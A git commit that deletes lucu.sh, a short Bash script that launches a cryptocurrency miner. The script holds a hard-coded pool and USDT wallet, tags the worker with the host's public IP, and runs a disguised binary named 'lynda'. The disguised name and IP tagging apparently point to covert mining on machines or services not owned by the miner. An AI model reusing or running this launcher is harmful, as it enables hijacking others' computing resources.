a476c55d75c823aae35557d7e3ba1b7ad0539781
Andika <85240294+jialezi990@users.noreply.github.com>
2021-06-02 21:29:51 +0700

    Delete lucu.sh

--- lucu.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-POOL=ethash.unmineable.com:3333
-WALLET=USDT:TMoY6tAtNEAq32F7aAdXJb6o6fxYm2Nhhm
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )#bi0o-a2ol
-
-cd "$(dirname "$0")"
-
-chmod +x ./lynda && ./lynda --algo ETHASH --pool $POOL --user $WALLET.$WORKER -ethstratum ETHPROXY $@
